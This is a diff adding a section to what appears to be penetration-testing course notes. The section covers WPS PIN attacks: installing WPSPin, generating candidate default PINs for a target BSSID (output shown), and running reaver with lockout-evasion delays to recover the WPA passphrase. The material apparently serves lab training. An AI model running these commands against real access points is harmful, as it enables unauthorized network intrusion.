@@ -496,3 +496,96 @@ Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetso
 [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
 ```
 
+### Using Multiple Pre-Definde PINs
+
+While it's possible to bruteforce the WPS PIN using Reaver, you can also use a custom wordlist of potential PINs.
+
+The [WPSPin](https://github.com/epicdev420/WPSPin) tool is a powerful tool that includes many different PIN generation algorithms. This tool allows you to once again provide the BSSID of your target network and receive a list of possible default PINs.
+
+Installing it:
+
+```bash
+d41y@htb[/htb]$ git clone https://github.com/epicdev420/WPSPin.git
+
+Cloning into 'wpspin'...
+remote: Enumerating objects: 44, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 44 (delta 0), reused 2 (delta 0), pack-reused 40
+Receiving objects: 100% (44/44), 21.46 KiB | 499.00 KiB/s, done.
+Resolving deltas: 100% (10/10), done.
+```
+
+Then:
+
+```bash
+d41y@htb[/htb]$ cd wpspin
+d41y@htb[/htb]$ sudo python setup.py install
+```
+
+Once WPSPin is installed, you can employ the following command to generate possible default PINs. You specify your `BSSID` and `-A` to generate any and all possible PINs.
+
+```bash
+d41y@htb[/htb]$ wpspin -A 60:38:E0:A2:3D:2A
+
+Found 49 PIN(s)
+PIN        Name
+73834410   44-bit PIN
+94229882   Static PIN — H108L
+73834410   40-bit PIN
+06490959   Reverse bits 32-bit
+11184812   24-bit PIN
+63311501   Reverse nibble 32-bit
+11184812   28-bit PIN
+36499373   48-bit PIN
+63313604   Reverse byte 32-bit
+99956042   Static PIN — Onlime
+95661469   Static PIN — Realtek 1
+89478486   Reverse bits 24-bit
+11184812   Reverse nibble 24-bit
+           Empty PIN
+11184812   Reverse byte 24-bit
+95755212   Static PIN — CBN ONO
+20854836   Static PIN — Upvel
+20144326   Airocon Realtek
+33946153   D-Link PIN +1
+13142452   ASUS PIN
+74163052   OUI ^ NIC
+51875350   OUI − NIC
+43977680   Static PIN — UR-814AC
+56587340   Inv NIC to PIN
+95719115   Static PIN — Realtek 2
+48563710   Static PIN — Realtek 3
+92148659   32-bit PIN
+05294176   Static PIN — UR-825AC
+89532331   36-bit PIN
+68175542   Static PIN — DSL-2740R
+71412252   Static PIN — Airocon 2
+80652847   D-Link PIN
+76229909   Static PIN — Broadcom 3
+46264848   Static PIN — Broadcom 2
+82799427   Reverse nibble 48-bit
+20233921   Reverse byte 48-bit
+31957199   Static PIN — Broadcom 6
+10864111   Static PIN — Broadcom 5
+62327145   Static PIN — Broadcom 4
+30432031   Static PIN — Airocon 1
+90970948   Reverse bits 48-bit
+22369628   NIC * 2
+33554433   NIC * 3
+34259283   Static PIN — HG532x
+35611530   Static PIN — Edimax
+20172527   Static PIN — Broadcom 1
+67958146   Static PIN — Thomson
+12345670   Static PIN — Cisco
+74244973   OUI + NIC
+```
+
+WPSPin outputs a variety of possible PINs for valid BSSIDs. To retrieve the WPA-PSK from a known PIN, you can use the following command:
+
+```bash
+d41y@htb[/htb]$ sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p 73834410
+```
+
+In the above command, `-l` sets the time to wait if the access point locks WPS PIN attempts, which is set to 100 seconds. The `-r` option specifies the recurring delay, meaning the command will sleep for 45 seconds every 3 attempts. The `--max-attempts=1` specifies that the tool will only attempt the PIN one time. This option ensures that the PIN is tested just once, rather than multiple attempts.
+
